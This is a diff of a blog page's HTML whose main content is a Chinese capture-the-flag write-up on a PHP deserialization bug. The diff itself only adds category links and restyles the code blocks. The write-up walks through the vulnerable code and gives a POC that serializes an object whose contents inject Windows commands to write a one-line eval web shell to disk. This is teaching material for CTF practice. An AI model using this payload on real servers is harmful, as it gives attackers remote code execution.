@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                    <b>#</b> PHP漏洞
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -192,77 +213,77 @@
 <span id="more"></span>
 
 <p>首先看下源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello ctfer"</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z]/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token string double-quoted-string">"..."</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">function</span> <span class="token function-definition function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class A
+&#123;
+    public $contents = &quot;hello ctfer&quot;;
+    function __toString()
+    &#123;
+        if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents))) &#123;
+            system(&quot;echo $this-&gt;contents&quot;);
+            return &#39;111&#39;;
+        &#125;else&#123;
+            return &quot;...&quot;;
+        &#125;
+    &#125;
+&#125;
+function decode_data($data)&#123;
+    $data = base64_decode($data);
+    $res = &#39;&#39;;
+    for($i=0; $i&lt; strlen($data); $i++)&#123;
+        $res .= chr(ord($data[$i]) + $i);
+    &#125;
+    return $res;
+&#125;
+if (isset($_GET[&#39;data&#39;])) &#123;
+    $data =$_GET[&#39;data&#39;];
+    $data = decode_data($data);
+    echo unserialize($data);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
 <p>分析代码可知，第28号处有<code>unserialize()</code>，这意味着这道题是PHP反序列化漏洞的题且我们需要传入一个携带<code>data</code>参数的GET请求。</p>
 <h2 id="确定利用的Class"><a href="#确定利用的Class" class="headerlink" title="确定利用的Class"></a>确定利用的Class</h2><p>那么这里有什么可以被我们用来利用的类吗？这时我看到了<code>class A</code>，发现如下代码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z]/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处高亮！！发现了命令执行代码</span>
-            <span class="token keyword">return</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token string double-quoted-string">"..."</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">function __toString()
+    &#123;
+        if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents))) &#123;
+            system(&quot;echo $this-&gt;contents&quot;);//此处高亮！！发现了命令执行代码
+            return &#39;111&#39;;
+        &#125;else&#123;
+            return &quot;...&quot;;
+        &#125;
+    &#125;
+</code></pre>
 <p>在<code>Class A</code>中，有一个<code>toString()</code>的方法，方法内部有我们想要的命令执行代码。</p>
 <p>我们知道当Object与字符串比较或被执行与字符串相关操作的时候，<code>__toString()</code>会被call。继续看，<code>$data</code>会被执行<code>decode_data($data)</code></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//此处data被取了strlen,所以to_String()是会被call的</span>
-        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">function decode_data($data)&#123;
+    $data = base64_decode($data);
+    $res = &#39;&#39;;
+    for($i=0; $i&lt; strlen($data); $i++)&#123;//此处data被取了strlen,所以to_String()是会被call的
+        $res .= chr(ord($data[$i]) + $i);
+    &#125;
+    return $res;
+&#125;
+</code></pre>
 <p>重点来了，<code>strlen($data)</code>代表着<code>$data</code>最终是会被执行<code>__toString()</code>的，那么我们更加确信，<code>Class A</code> <strong>可以被我们利用实现反序列化</strong>。</p>
 <h2 id="构造利用Class"><a href="#构造利用Class" class="headerlink" title="构造利用Class"></a>构造利用Class</h2><p>在<code>__toString()</code>方法中，我们必须满足 <code>if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents)))</code>，才能执行<code>system()</code>命令。</p>
 <p>来看下<code>preg_match()</code>解释</p>
 <p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723150712496.png" alt="image-20210723150712496"></p>
 <p>由此可知，<code>preg_match()</code>在第一次匹配到结果后，就结束匹配了。那么我们可以把代码理解为如下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-    <span class="token comment">//从变量contents的开头第一个字符开始，到最后一个字符，匹配是否为a-z的字母，如果结果为真，进入下面的代码，否则进入else&#123;&#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z]/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">contents</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//命令执行</span>
-            <span class="token keyword">return</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token string double-quoted-string">"..."</span><span class="token punctuation">;</span><span class="token comment">//未匹配到</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">function __toString()
+    &#123;
+    //从变量contents的开头第一个字符开始，到最后一个字符，匹配是否为a-z的字母，如果结果为真，进入下面的代码，否则进入else&#123;&#125;
+        if ((preg_match(&#39;/^[a-z]/i&#39;,$this-&gt;contents))) &#123;
+            system(&quot;echo $this-&gt;contents&quot;);//命令执行
+            return &#39;111&#39;;
+        &#125;else&#123;
+            return &quot;...&quot;;//未匹配到
+        &#125;
+    &#125;
+</code></pre>
 <p>举个例子，如果我们<code>$contents=&quot;&lt;?php phpinfo() ?&gt;&quot;</code>,<code>preg_match()</code>就会匹配失败，因为我们第一个字符不是字母<code>a-z</code>。但如果我们的<code>contents=&quot;a&lt;?php phpinfo() ?&gt;&quot;</code>，这时候<code>preg_match()</code>匹配到第一个字符为a，符合条件，于是不再继续检测，返回<code>true</code>。</p>
 <p>观察 <code>system(&quot;echo $this-&gt;contents&quot;);</code>中有一个<code>echo</code>，是输出的意思。因为我是在<code>windows</code>的环境上搭建的，所以我们需要用<code>windows</code>的<code>DOS</code>命令。这时我想到了使用<code>&amp;</code>来执行多条命令，所以</p>
 <p>因此我们可以构造<code>$contents=&#39;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#39;</code>将一句话木马写入<code>leihehe.php</code>文件中</p>
@@ -271,51 +292,51 @@
 <p>还有要注意单引号和双引号的问题，PHP中给变量赋值的时候，用双引号会把一些符号给翻译成PHP语言，所以我们这种符号比较多的情况，要用单引号，<code>$_POST[&quot;leihehe&quot;]</code>里面的内容用双引号。</p>
 <p>这样我们的<code>Class A</code>就构造好了。</p>
 <h2 id="序列化及加密（逆向思维）"><a href="#序列化及加密（逆向思维）" class="headerlink" title="序列化及加密（逆向思维）"></a>序列化及加密（逆向思维）</h2><p>那么我们应该怎么把他序列化呢？</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">function decode_data($data)&#123;
+    $data = base64_decode($data);
+    $res = &#39;&#39;;
+    for($i=0; $i&lt; strlen($data); $i++)&#123;
+        $res .= chr(ord($data[$i]) + $i);
+    &#125;
+    return $res;
+&#125;
+if (isset($_GET[&#39;data&#39;])) &#123;
+    $data =$_GET[&#39;data&#39;];
+    $data = decode_data($data);
+    echo unserialize($data);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
 <p>通过观察，data被传入后会进行自定义的解码，最后再被反序列化。反过来，我们需要先序列化后，再按照它自定义的方式编码。</p>
 <p>来看看他是如何解码的</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//base64解码</span>
-    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//将base64解码后的每一个字符都用ord转换成ASCII后，加上它所在的index，再用chr()转换回字符。</span>
-        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="php">function decode_data($data)&#123;
+    $data = base64_decode($data);//base64解码
+    $res = &#39;&#39;;
+    for($i=0; $i&lt; strlen($data); $i++)&#123;//将base64解码后的每一个字符都用ord转换成ASCII后，加上它所在的index，再用chr()转换回字符。
+        $res .= chr(ord($data[$i]) + $i);
+    &#125;
+    return $res;
+&#125;
+</code></pre>
 <p>那么他的处理过程是：</p>
 <p>data-&gt;base64解码-&gt;chr(ord($data)+$i)-&gt;反序列化</p>
 <p>反过来，我们构造的过程可以是：</p>
 <p>序列化-&gt;<code>chr(ord($data)-$i)</code>-&gt;base64加密-&gt;data</p>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">Class</span> <span class="token class-name-definition class-name">A</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a &amp; echo ^&lt;^?php ^@eval(^$_POST["leihehe"]);^?^> >>leihehe.php'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code class="php">&lt;?php
+Class A
+&#123;
+    public $contents = &#39;a &amp; echo ^&lt;^?php ^@eval(^$_POST[&quot;leihehe&quot;]);^?^&gt; &gt;&gt;leihehe.php&#39;;
+    &#125;
 
-<span class="token variable">$af</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//序列化</span>
-<span class="token variable">$res</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$af</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//自定义编码过程</span>
-    <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$af</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//base64编码后输出</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+$af=serialize(new A());//序列化
+$res=&#39;&#39;;
+for($i=0; $i&lt; strlen($af); $i++)&#123;//自定义编码过程
+    $res .= chr(ord($af[$i]) - $i);
+&#125;
+echo base64_encode($res);//base64编码后输出
+?&gt;
+</code></pre>
 <p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163609369.png" alt="image-20210723163609369"></p>
 <p>赋值给$data：</p>
 <p><img src="/image/%E8%AE%B0%E6%9F%90CTF%E8%B5%9B%E9%A2%98PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210723163906677.png" alt="image-20210723163906677"></p>
@@ -351,6 +372,23 @@
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/PHP%E6%BC%8F%E6%B4%9E/" title="PHP漏洞">
+                        <b>#</b> PHP漏洞
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
